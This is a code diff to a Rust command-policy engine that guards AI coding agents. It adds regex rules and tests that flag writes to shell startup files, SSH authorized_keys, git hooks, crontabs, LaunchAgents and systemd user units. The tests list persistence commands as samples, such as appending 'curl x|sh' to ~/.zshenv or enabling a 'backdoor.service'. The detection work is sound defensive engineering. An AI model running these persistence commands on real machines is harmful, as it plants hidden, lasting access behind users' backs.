@@ -219,6 +219,8 @@ pub fn builtin_rules() -> &'static [PolicyRule] {
         // Path segments of the agent config / hook files Vallum protects.
         // Matched anywhere on the line; the leading `\.` anchors each segment.
         const AGENT_CFG: &str = r"(?:\.claude/settings(?:\.local)?\.json|\.cursor/hooks\.json|\.codex/(?:hooks\.json|config\.toml)|\.gemini/settings\.json|\.mcp\.json)";
+        // Shell startup / rc files an agent could write to for persistence.
+        const RC_NAMES: &str = r"(?:\.zshenv|\.zshrc|\.zprofile|\.bashrc|\.bash_profile|\.profile)";
         let ask = |name: &str, pat: &str, reason: &str| PolicyRule {
             name: name.to_string(),
             pattern: Regex::new(pat).unwrap(),
@@ -229,6 +231,44 @@ pub fn builtin_rules() -> &'static [PolicyRule] {
             ask("rm_rf_root",
                 r"(?i)\brm\s+(?:-\S+\s+)*(?:-\S*(?:r\S*f|f\S*r)\S*|(?:-\S*r\S*|--recursive)\s+(?:-\S+\s+)*(?:-\S*f\S*|--force)|(?:-\S*f\S*|--force)\s+(?:-\S+\s+)*(?:-\S*r\S*|--recursive)|--recursive|--force)\s+(?:-\S+\s+)*(?:(?:/|~|\$HOME)(?:/?\*?)|/(?:bin|etc|usr|var|lib|lib64|boot|sbin|opt|root|sys|proc|dev|System|Library)(?:/\*?)?)(?:[\s;&|)`]|$)",
                 "Recursive force-delete targeting a root, home, or system path"),
+            // Persistence-write rules (CVE-2026-55607 class). Placed before
+            // curl_pipe_shell so a shell-profile / git-hook write that embeds a
+            // `curl x|sh` payload is attributed to the persistence rule (the
+            // primary risk), not to curl_pipe_shell. All are equal-severity
+            // Ask, and the engine keeps the first matching rule on a tie.
+            ask("write_shell_profile",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?(?:[^\s;&|)]*/)?{rc}['"]?(?:[\s;&|)]|$)|\btee\b(?:\s+-\S+)*\s+['"]?(?:[^\s;&|)]*/)?{rc}['"]?(?:[\s;&|)]|$)|\bof=['"]?(?:[^\s;&|)]*/)?{rc}['"]?(?:[\s;&|)]|$)|\bsed\b[^|\n]*\s-i[^|\n]*/{rc}\b|\b(?:cp|mv|install)\b[^|\n]*\s['"]?(?:[^\s;&|)]*/)?{rc}['"]?\s*(?:[;&|)]|$))"#,
+                    rc = RC_NAMES
+                ),
+                "Writing to a shell startup file (persistence, CVE-2026-55607 class)"),
+            ask("write_ssh_config",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?[^\s;&|)]*{cfg}|\btee\b(?:\s+-\S+)*\s+['"]?[^\s;&|)]*{cfg}|\bof=['"]?[^\s;&|)]*{cfg}|\bsed\b[^|\n]*\s-i[^|\n]*{cfg}|\b(?:cp|mv|install)\b[^|\n]*\s['"]?[^\s;&|)]*{cfg}['"]?\s*(?:[;&|)]|$))"#,
+                    cfg = r"\.ssh/(?:authorized_keys2?|config)\b"
+                ),
+                "Writing to SSH authorized_keys/config (persistent access)"),
+            ask("write_git_hooks",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?[^\s;&|)]*{cfg}|\btee\b(?:\s+-\S+)*\s+['"]?[^\s;&|)]*{cfg}|\bof=['"]?[^\s;&|)]*{cfg}|\bsed\b[^|\n]*\s-i[^|\n]*{cfg}|\b(?:cp|mv|install)\b[^|\n]*\s['"]?[^\s;&|)]*{cfg}|\bgit\b[^|\n]*\bconfig\b[^|\n]*\bcore\.hooksPath\b)"#,
+                    cfg = r"\.git/hooks/"
+                ),
+                "Writing a git hook or redirecting core.hooksPath (persistence)"),
+            ask("write_crontab",
+                r"(?i)(?:\bcrontab\s*(?:$|[;&|)])|\bcrontab\s+(?:-u\s+\S+\s+)?(?:-[er]\b|-(?:\s|$|[;&|)])|[^-\s]\S*))",
+                "Installing or modifying a crontab (persistence)"),
+            ask("write_launch_agents",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?[^\s;&|)]*{cfg}|\btee\b(?:\s+-\S+)*\s+['"]?[^\s;&|)]*{cfg}|\bof=['"]?[^\s;&|)]*{cfg}|\bsed\b[^|\n]*\s-i[^|\n]*{cfg}|\b(?:cp|mv|install)\b[^|\n]*\s['"]?[^\s;&|)]*{cfg}|\blaunchctl\s+(?:load|bootstrap)\b)"#,
+                    cfg = r"Library/Launch(?:Agents|Daemons)/"
+                ),
+                "Writing or loading a macOS LaunchAgent/LaunchDaemon (persistence)"),
+            ask("write_systemd_user",
+                &format!(
+                    r#"(?i)(?:>>?\s*['"]?[^\s;&|)]*{cfg}|\btee\b(?:\s+-\S+)*\s+['"]?[^\s;&|)]*{cfg}|\bof=['"]?[^\s;&|)]*{cfg}|\bsed\b[^|\n]*\s-i[^|\n]*{cfg}|\b(?:cp|mv|install)\b[^|\n]*\s['"]?[^\s;&|)]*{cfg}|\bsystemctl\s+--user\s+enable\b)"#,
+                    cfg = r"\.config/systemd/user/"
+                ),
+                "Writing or enabling a systemd user unit (persistence)"),
             ask("curl_pipe_shell",
                 r"(?i)\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:sh|bash|zsh|dash)\b",
                 "Piping downloaded content directly into a shell interpreter"),
@@ -308,6 +348,12 @@ pub fn builtin_names() -> Vec<&'static str> {
         "git_clean_force",
         "chown_recursive_root",
         "write_agent_config",
+        "write_shell_profile",
+        "write_ssh_config",
+        "write_git_hooks",
+        "write_crontab",
+        "write_launch_agents",
+        "write_systemd_user",
     ]
 }
 
@@ -426,7 +472,7 @@ mod tests {
     #[test]
     fn builtins_all_ask_and_named() {
         let names = builtin_names();
-        assert_eq!(names.len(), 18);
+        assert_eq!(names.len(), 24);
         assert_eq!(names.len(), builtin_rules().len(), "names must track rules");
         for r in builtin_rules() {
             assert_eq!(
@@ -677,5 +723,144 @@ mod tests {
                 "expected Allow for: {b}"
             );
         }
+    }
+
+    #[test]
+    fn write_shell_profile_asks_on_writes() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "echo 'curl x|sh' >> ~/.zshenv",
+            "echo x > $HOME/.bashrc",
+            "bash -c \"echo x >> ~/.zshenv\"",
+            "tee -a /home/u/.zprofile",
+            "sed -i 's/a/b/' ~/.zshrc",
+            "cp payload ~/.bash_profile",
+            "mv payload /Users/u/.profile",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_shell_profile", "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_shell_profile_allows_reads_and_lookalikes() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "source ~/.zshrc",
+            "cat ~/.bashrc",
+            "grep PATH ~/.profile",
+            "mv temp ~/.profile.bak",
+            "cp app.profile build/app.profile",
+            "diff ~/.zshrc ~/.zshrc.orig",
+        ] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_ssh_config_asks_on_writes_allows_reads() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "echo 'ssh-ed25519 AAAA' >> ~/.ssh/authorized_keys",
+            "tee -a ~/.ssh/config",
+            "cp evil_config ~/.ssh/config",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_ssh_config", "{cmd}");
+        }
+        for cmd in [
+            "cat ~/.ssh/config",
+            "ssh-keygen -t ed25519 -C ci",
+            "ls ~/.ssh",
+        ] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_git_hooks_asks_on_writes_and_hookspath() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "cp hook .git/hooks/pre-commit",
+            "echo 'curl x|sh' > .git/hooks/post-checkout",
+            "git config core.hooksPath /tmp/evil-hooks",
+            "git config --global core.hooksPath ~/h",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_git_hooks", "{cmd}");
+        }
+        for cmd in [
+            "ls .git/hooks",
+            "git config user.name Emir",
+            "cat .git/hooks/pre-commit",
+        ] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_crontab_asks_on_installs_allows_list() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "crontab evil.cron",
+            "crontab -e",
+            "crontab -r",
+            "echo '* * * * * curl x|sh' | crontab -",
+            "crontab",
+            "crontab -u deploy evil.cron",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_crontab", "{cmd}");
+        }
+        for cmd in ["crontab -l", "crontab -u deploy -l"] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_launch_agents_asks_on_writes_and_load() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "cp evil.plist ~/Library/LaunchAgents/com.x.plist",
+            "tee ~/Library/LaunchDaemons/com.x.plist",
+            "launchctl load ~/Library/LaunchAgents/com.x.plist",
+            "launchctl bootstrap gui/501 com.x.plist",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_launch_agents", "{cmd}");
+        }
+        for cmd in ["launchctl list", "ls ~/Library/LaunchAgents"] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn write_systemd_user_asks_on_writes_and_enable() {
+        let p = Policy::compile(&PolicyConfig::default()).unwrap();
+        for cmd in [
+            "cp unit.service ~/.config/systemd/user/x.service",
+            "echo '[Service]' > ~/.config/systemd/user/x.service",
+            "systemctl --user enable backdoor.service",
+        ] {
+            let v = p.evaluate(cmd);
+            assert_eq!(v.action, PolicyAction::Ask, "{cmd}");
+            assert_eq!(v.rule_name, "write_systemd_user", "{cmd}");
+        }
+        for cmd in [
+            "systemctl --user status syncthing",
+            "systemctl --user list-units",
+        ] {
+            assert_eq!(p.evaluate(cmd).action, PolicyAction::Allow, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn builtin_names_has_24_rules() {
+        assert_eq!(builtin_names().len(), 24);
     }
 }
